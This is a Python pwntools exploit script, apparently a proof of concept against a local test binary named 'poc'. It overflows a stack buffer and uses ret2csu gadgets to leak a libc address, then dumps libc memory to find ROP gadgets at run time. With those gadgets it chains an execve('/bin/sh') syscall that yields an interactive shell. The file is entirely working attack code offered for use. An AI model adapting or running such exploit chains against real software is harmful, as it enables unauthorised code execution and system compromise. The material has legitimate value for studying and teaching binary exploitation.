from pwn import *
from struct import *
  
#context.log_level = 'debug'
  
binary = ELF('./poc')
 
execve = 59
 
addr_bss = 0x601040
addr_got_read = binary.got['read']
addr_got_write = binary.got['write']
addr_got_start = binary.got['__libc_start_main']
  
addr_csu_init1 = 0x40060a
addr_csu_init2 = 0x4005f0
addr_csu_init3 = 0x40060d
  
stacksize = 0x400
base_stage = addr_bss + stacksize
  
p = process(binary.path)
p.recvn(10)
  
# stage 1: read address of __libc_start_main()
buf = 'A' * 72
#Gadget 1
buf += p64(addr_csu_init1)
buf += p64(0)
buf += p64(1)
buf += p64(addr_got_write)
buf += p64(8)
buf += p64(addr_got_start)
buf += p64(1)
#Gadget 2 - write(1,__libc_start_main,8)
buf += p64(addr_csu_init2)
buf += p64(0)
buf += p64(0)
buf += p64(1)
buf += p64(addr_got_read)
buf += p64(400)
buf += p64(base_stage)
buf += p64(0)
#Gadget 2 - Call read(0,.bss + 0x400,400)
buf += p64(addr_csu_init2)
buf += p64(0)
buf += p64(0)
buf += p64(0)
buf += p64(0)
buf += p64(0)
buf += p64(0)
buf += p64(0)
 
buf += p64(addr_csu_init3)
buf += p64(base_stage)

p.send(buf)
libc_addr = u64(p.recv())
log.info("__libc_start_main : " + hex(libc_addr))
  

libc_bin = ''
libc_readsize = 0x190000
 
# stage 2: "/bin/sh\x00" and JIT ROP
buf = "/bin/sh\x00"
buf += 'A' * (24-len(buf))
 
 
buf += p64(addr_csu_init1)
buf += p64(0)
buf += p64(1)
buf += p64(addr_got_write)
buf += p64(libc_readsize)
buf += p64(libc_addr)
buf += p64(1)
  
#Gadget 1 - write(1,Address of leak libc,0x190000)
buf += p64(addr_csu_init2)
buf += p64(0)
buf += p64(0)
buf += p64(1)
buf += p64(addr_got_read)
buf += p64(100)
buf += p64(base_stage + len(buf) + 8 * 10)
buf += p64(0)
  
#Gadget 2 - read(0,"base_stage + len(buf) + 8 * 10" ,100)
buf += p64(addr_csu_init2)
buf += p64(0)
buf += p64(0)
buf += p64(0)
buf += p64(0)
buf += p64(0)
buf += p64(0)
buf += p64(0)
 
p.send(buf)
  
with log.progress('Reading libc area from memory...') as l:
    for i in range(0,libc_readsize/4096):
        libc_bin += p.recv(4096)
        l.status(hex(len(libc_bin)))
 
offs_pop_rax = libc_bin.index('\x58\xc3') # pop rax; ret
offs_pop_rdi = libc_bin.index('\x5f\xc3') # pop rdi; ret
offs_pop_rsi = libc_bin.index('\x5e\xc3') # pop rsi; ret
offs_pop_rdx = libc_bin.index('\x5a\xc3') # pop rdx; ret
offs_syscall = libc_bin.index('\x0f\x05') # syscall
 
log.info("Gadget : pop rax; ret > " + hex(libc_addr + offs_pop_rax))
log.info("Gadget : pop rdi; ret > " + hex(libc_addr + offs_pop_rdi))
log.info("Gadget : pop rsi; ret > " + hex(libc_addr + offs_pop_rsi))
log.info("Gadget : pop rdx; ret > " + hex(libc_addr + offs_pop_rdx))
log.info("Gadget : syscall > " + hex(libc_addr + offs_syscall))
  
# stage 3: execve("/bin/sh", NULL, NULL)
buf = p64(libc_addr + offs_pop_rax)
buf += p64(execve)
buf += p64(libc_addr + offs_pop_rdi)
buf += p64(base_stage)
buf += p64(libc_addr + offs_pop_rsi)
buf += p64(0)
buf += p64(libc_addr + offs_pop_rdx)
buf += p64(0)
buf += p64(libc_addr + offs_syscall)
  
p.send(buf)
p.interactive()
